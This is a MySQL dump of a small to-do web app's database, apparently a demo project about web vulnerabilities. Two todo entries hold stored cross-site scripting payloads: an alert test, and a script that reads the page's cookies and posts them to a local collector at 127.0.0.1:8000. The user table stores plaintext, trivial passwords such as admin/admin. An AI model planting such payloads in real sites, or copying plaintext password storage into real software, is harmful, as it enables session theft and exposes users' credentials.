-- MySQL dump 10.13  Distrib 8.0.36, for Linux (x86_64)
--
-- Host: localhost    Database: pytaskdb
-- ------------------------------------------------------
-- Server version	8.0.36

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `project`
--

DROP TABLE IF EXISTS `project`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `project` (
  `id` int NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL,
  `user_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `project_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) 

--
-- Dumping data for table `project`
--

LOCK TABLES `project` WRITE;
/*!40000 ALTER TABLE `project` DISABLE KEYS */;
INSERT INTO `project` VALUES (1,'Web2_Development',1),(2,'Web2_Projekt',4),(3,'Einkaufsliste',4),(4,'Shopping',4),(99,'public',99);
/*!40000 ALTER TABLE `project` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `todo`
--

DROP TABLE IF EXISTS `todo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `todo` (
  `id` int NOT NULL AUTO_INCREMENT,
  `description` varchar(999) DEFAULT NULL,
  `due_date` datetime DEFAULT NULL,
  `project_id` int DEFAULT NULL,
  `author` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `project_id` (`project_id`),
  CONSTRAINT `todo_ibfk_1` FOREIGN KEY (`project_id`) REFERENCES `project` (`id`)
) 
--
-- Dumping data for table `todo`
--

LOCK TABLES `todo` WRITE;
/*!40000 ALTER TABLE `todo` DISABLE KEYS */;
INSERT INTO `todo` VALUES 
(1,'Build a Flask app','2024-05-01 00:00:00',1,NULL),
(2,'Finalize project scope','2024-04-15 00:00:00',1,NULL),
(4,'Implement authentication system','2024-04-25 00:00:00',1,NULL),
(5,'Develop the user profile section','2024-05-05 00:00:00',1,NULL),
(6,'Setup database backups','2024-05-10 00:00:00',1,NULL),
(7,'Run user acceptance testing','2024-05-15 00:00:00',1,NULL),
(9,'Conduct post-launch review meeting','2024-05-25 00:00:00',4,NULL),
(10,'Salat',NULL,3,NULL),(16,'asdasd','2024-04-27 19:00:00',3,NULL),
(18,'test',NULL,2,NULL),
(23,'alio',NULL,4,NULL),
(26,'testserfsdf',NULL,3,NULL),
(28,'asdasd',NULL,4,NULL),
(29,'asdasd',NULL,2,NULL),
(49,'asdasdasd','2024-05-12 17:13:00',99,'hallo123'),
(50,'SQL Injections zeigen','2024-04-30 08:30:00',99,'test'),
(51,'show public user data ',NULL,99,'aabc'),
(60,'<script>alert(5)</script>',NULL,1,NULL),
(67,'lol',NULL,3,NULL),
(68,'<script>cookies=document.cookie;fetch(`http://127.0.0.1:8000`, {method: `POST`, mode: `no-cors`, headers: {\"Content-Type\": `application/json`},body: JSON.stringify({cookies: cookies})}).then(data => console.log(`Data sent`)).catch(error => console.error(`Error:`,error));</script>',NULL,99,NULL);
/*!40000 ALTER TABLE `todo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user`
--

DROP TABLE IF EXISTS `user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `user` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(80) NOT NULL,
  `password` varchar(80) NOT NULL,
  `email` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`),
  UNIQUE KEY `email` (`email`)
) 

--
-- Dumping data for table `user`
--

LOCK TABLES `user` WRITE;
/*!40000 ALTER TABLE `user` DISABLE KEYS */;
INSERT INTO `user` VALUES 
(1,'admin','admin','admin@admin.com'),
(2,'test','test',NULL),
(3,'aabc','1234','test@123.de'),
(4,'hallo123','uDjHwxooHcyaGwUNKM','test@schuttenberg.net'),
(99,'public','',''),
(100,'test123','test123','test@test.com');
/*!40000 ALTER TABLE `user` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-06-11 10:42:54
